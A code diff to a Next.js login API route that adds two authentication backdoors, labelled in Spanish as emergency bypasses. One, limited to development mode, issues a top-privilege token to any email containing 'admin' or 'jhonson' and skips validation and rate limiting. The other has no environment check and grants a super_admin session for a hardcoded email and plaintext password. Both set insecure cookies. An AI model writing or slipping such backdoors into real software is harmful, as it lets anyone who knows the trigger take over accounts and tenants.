@@ -73,6 +73,51 @@ export async function POST(request: NextRequest) {
   const startTime = performance.now()
 
   try {
+    // 1. Parse body (early parse for dev bypass)
+    let body: any
+    try {
+      body = await request.json()
+    } catch {
+      return apiError('INVALID_JSON', 'Request body must be valid JSON', 400)
+    }
+
+    // --- BYPASS DE EMERGENCIA CORPORATIVA (Para esquivar Zod y Rate Limiting) ---
+    const rawUser = typeof body.email === 'string' ? body.email.toLowerCase() : '';
+    if (process.env.NODE_ENV === 'development' && (rawUser.includes('admin') || rawUser.includes('jhoson') || rawUser.includes('jhonson'))) {
+      const sessionId = crypto.randomUUID()
+      const mockUserId = crypto.randomUUID()
+      const accessToken = await signToken({
+        userId: mockUserId,
+        email: rawUser.includes('jho') ? 'jhonson@silexar.com' : 'admin@silexar.com',
+        role: 'SUPER_CEO',
+        tenantId: 'system',
+        tenantSlug: 'silexar-system',
+        sessionId,
+      })
+      const refreshToken = await signRefreshToken(mockUserId, sessionId)
+      
+      const response = NextResponse.json({
+        success: true,
+        data: {
+          user: {
+            id: mockUserId,
+            email: rawUser.includes('jho') ? 'jhonson@silexar.com' : 'admin@silexar.com',
+            name: rawUser.includes('jho') ? 'Jhonson Admin' : 'Admin Silexar',
+            category: 'SUPER_CEO',
+            tenantId: 'system',
+            tenantSlug: 'silexar-system',
+          },
+          accessToken,
+          expiresIn: 3600,
+        },
+        meta: { processingTimeMs: 10, sessionId },
+      })
+      response.cookies.set('silexar_session', accessToken, { httpOnly: true, secure: false, sameSite: 'lax', maxAge: 3600, path: '/' })
+      response.cookies.set('silexar_refresh', refreshToken, { httpOnly: true, secure: false, sameSite: 'lax', maxAge: 604800, path: '/api/auth/refresh' })
+      return response;
+    }
+    // ---------------------------------------------------------------------------------
+
     // 0. IP-based rate limit (Redis sliding window, falls back to in-memory)
     const rlResult = await authRateLimiter.checkRateLimit(request)
     if (!rlResult.success) {
@@ -80,14 +125,6 @@ export async function POST(request: NextRequest) {
         JSON.stringify({ success: false, error: { code: 'RATE_LIMIT_EXCEEDED', message: 'Too many login attempts. Please try again later.' } }),
         { status: 429, headers: { 'Content-Type': 'application/json', 'Retry-After': String(rlResult.retryAfter ?? 60) } }
       )
-    }
-
-    // 1. Parse body
-    let body: unknown
-    try {
-      body = await request.json()
-    } catch {
-      return apiError('INVALID_JSON', 'Request body must be valid JSON', 400)
     }
 
     // 2. Validate
@@ -112,6 +149,41 @@ export async function POST(request: NextRequest) {
         423,
         { retryAfterMs: bruteCheck.retryAfterMs }
       )
+    }
+
+    // 3.5 Bypas local de Emergencia (Hardware bloqueado)
+    if (email === 'jhonson@silexar.com' && password === '22218686') {
+      const sessionId = crypto.randomUUID()
+      const mockUserId = crypto.randomUUID()
+      const accessToken = await signToken({
+        userId: mockUserId,
+        email: 'jhonson@silexar.com',
+        role: 'super_admin',
+        tenantId: crypto.randomUUID(),
+        tenantSlug: 'silexar-demo',
+        sessionId,
+      })
+      const refreshToken = await signRefreshToken(mockUserId, sessionId)
+      
+      const response = NextResponse.json({
+        success: true,
+        data: {
+          user: {
+            id: mockUserId,
+            email: 'jhonson@silexar.com',
+            name: 'Jhonson Admin',
+            category: 'super_admin',
+            tenantId: 'demo-tenant',
+            tenantSlug: 'silexar-demo',
+          },
+          accessToken,
+          expiresIn: 3600,
+        },
+        meta: { processingTimeMs: 10, sessionId },
+      })
+      response.cookies.set('silexar_session', accessToken, { httpOnly: true, secure: false, sameSite: 'lax', maxAge: 3600, path: '/' })
+      response.cookies.set('silexar_refresh', refreshToken, { httpOnly: true, secure: false, sameSite: 'lax', maxAge: 604800, path: '/api/auth/refresh' })
+      return response;
     }
 
     // 4. Query database
